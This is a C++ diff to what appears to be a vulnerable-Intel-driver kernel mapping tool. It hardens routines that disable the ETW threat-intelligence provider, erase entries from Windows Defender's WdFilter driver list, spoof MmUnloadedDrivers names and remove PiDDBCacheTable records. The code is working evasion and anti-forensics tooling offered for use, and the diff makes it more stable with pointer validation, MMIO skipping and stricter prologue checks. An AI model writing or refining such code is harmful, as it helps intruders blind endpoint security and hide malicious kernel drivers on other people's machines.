@@ -261,6 +261,18 @@ static bool DisableKernelEtwTi() {
 
 	uint64_t provRegHandle = guidAddr - 0x20;
 
+	uint64_t linkFlink = 0;
+	uint64_t linkBlink = 0;
+	if (!intel_driver::ReadMemory(provRegHandle, &linkFlink, sizeof(linkFlink)) ||
+		!intel_driver::ReadMemory(provRegHandle + 8, &linkBlink, sizeof(linkBlink)))
+		return false;
+
+	auto canonical_kernel = [](uint64_t p) -> bool {
+		return (p >> 48) == 0xFFFF && p != 0 && (p & 0x7) == 0;
+	};
+	if (!canonical_kernel(linkFlink) || !canonical_kernel(linkBlink))
+		return false;
+
 	uint64_t enableOffset = provRegHandle + 0x30;
 
 	uint32_t enableInfo = 0;
@@ -532,8 +544,16 @@ bool intel_driver::ScanForNtoskrnlPhysBase() {
 
 	const uint64_t LARGE_PAGE = 0x200000;
 	const uint64_t MAX_SCAN = 0x100000000ULL;
+	const uint64_t MMIO_LOW_HOLE = 0xA0000ULL;
+	const uint64_t MMIO_LOW_HOLE_END = 0x100000ULL;
+	const uint64_t MMIO_HIGH_START = 0xC0000000ULL;
 
 	for (uint64_t pa = 0; pa < MAX_SCAN; pa += LARGE_PAGE) {
+		if (pa >= MMIO_HIGH_START)
+			break;
+		if (pa >= MMIO_LOW_HOLE && pa < MMIO_LOW_HOLE_END)
+			continue;
+
 		uint32_t mz_dw = 0;
 		if (!ArgusSingleReadDword(pa, &mz_dw))
 			continue;
@@ -827,9 +847,11 @@ bool intel_driver::ClearWdFilterDriverList() {
 	};
 
 	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
-		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
+		Entry && Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
 		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
 	{
+		if (((uintptr_t)Entry >> 48) != 0xFFFF)
+			break;
 		UNICODE_STRING Unicode_String;
 		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
 			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
@@ -855,10 +877,14 @@ bool intel_driver::ClearWdFilterDriverList() {
 					if (my_idx < 0)
 						return false;
 
-					int last_idx = (int)current - 1;
+					int last_idx = scan_max - 1;
+					if (last_idx < my_idx)
+						last_idx = my_idx;
+
 					if (my_idx != last_idx) {
 						PVOID tail_value = 0;
-						ReadMemory(RuntimeDriversArray + (last_idx * 8), &tail_value, sizeof(PVOID));
+						if (!ReadMemory(RuntimeDriversArray + (last_idx * 8), &tail_value, sizeof(PVOID)))
+							return false;
 						WriteMemory(RuntimeDriversArray + (my_idx * 8), &tail_value, sizeof(PVOID));
 					}
 					PVOID zero_slot = nullptr;
@@ -886,12 +912,19 @@ bool intel_driver::ClearWdFilterDriverList() {
 								uintptr_t imgLo = WdFilter;
 								uintptr_t imgHi = WdFilter + nt.OptionalHeader.SizeOfImage;
 								if (MpFreeDriverInfoEx > imgLo && MpFreeDriverInfoEx < imgHi) {
-									uint8_t prologue = 0;
-									if (ReadMemory(MpFreeDriverInfoEx, &prologue, 1)) {
-										if (prologue == 0x40 || prologue == 0x48 || prologue == 0x55 ||
-											prologue == 0x53 || prologue == 0x56 || prologue == 0x57 ||
-											prologue == 0x4C || prologue == 0xE9 || prologue == 0x44 ||
-											prologue == 0x41)
+									uint8_t prologue[4] = { 0 };
+									if (ReadMemory(MpFreeDriverInfoEx, prologue, sizeof(prologue))) {
+										bool strict_prologue =
+											(prologue[0] == 0x48 && prologue[1] == 0x89 && prologue[2] == 0x5C && prologue[3] == 0x24) ||
+											(prologue[0] == 0x48 && prologue[1] == 0x83 && prologue[2] == 0xEC) ||
+											(prologue[0] == 0x40 && prologue[1] == 0x55) ||
+											(prologue[0] == 0x40 && prologue[1] == 0x53) ||
+											(prologue[0] == 0x40 && prologue[1] == 0x56) ||
+											(prologue[0] == 0x40 && prologue[1] == 0x57) ||
+											(prologue[0] == 0x48 && prologue[1] == 0x8B && prologue[2] == 0xC4) ||
+											(prologue[0] == 0x4C && prologue[1] == 0x8B && prologue[2] == 0xDC) ||
+											(prologue[0] == 0x41 && (prologue[1] == 0x54 || prologue[1] == 0x55 || prologue[1] == 0x56 || prologue[1] == 0x57));
+										if (strict_prologue)
 											safe_to_free = true;
 									}
 								}
@@ -1029,20 +1062,29 @@ bool intel_driver::ClearMmUnloadedDrivers() {
 	if (!object)
 		return false;
 
+	auto is_canonical_kva = [](uint64_t p) -> bool {
+		return p != 0 && (p >> 48) == 0xFFFF && (p & 0x7) == 0;
+	};
+
 	uint64_t device_object = 0;
-	if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)) || !device_object)
+	if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)) || !is_canonical_kva(device_object))
 		return false;
 
 	uint64_t driver_object = 0;
-	if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object)
+	if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)) || !is_canonical_kva(driver_object))
 		return false;
 
 	uint64_t driver_section = 0;
-	if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section)
+	if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !is_canonical_kva(driver_section))
 		return false;
 
 	UNICODE_STRING us_driver_base_dll_name = { 0 };
-	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0 || !us_driver_base_dll_name.Buffer)
+	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
+		return false;
+	if (us_driver_base_dll_name.Length == 0 ||
+		us_driver_base_dll_name.MaximumLength == 0 ||
+		us_driver_base_dll_name.MaximumLength > 0x200 ||
+		!is_canonical_kva((uint64_t)us_driver_base_dll_name.Buffer))
 		return false;
 
 	static const wchar_t* shortSpoofs[] = {
@@ -1216,16 +1258,16 @@ bool intel_driver::ClearPiDDBCacheTable() {
 		return false;
 	}
 
+	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
+		ExReleaseResourceLite(PiDDBLock);
+		return false;
+	}
+
 	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
 		ExReleaseResourceLite(PiDDBLock);
 		return false;
 	}
 	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
-		ExReleaseResourceLite(PiDDBLock);
-		return false;
-	}
-
-	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
 		ExReleaseResourceLite(PiDDBLock);
 		return false;
 	}
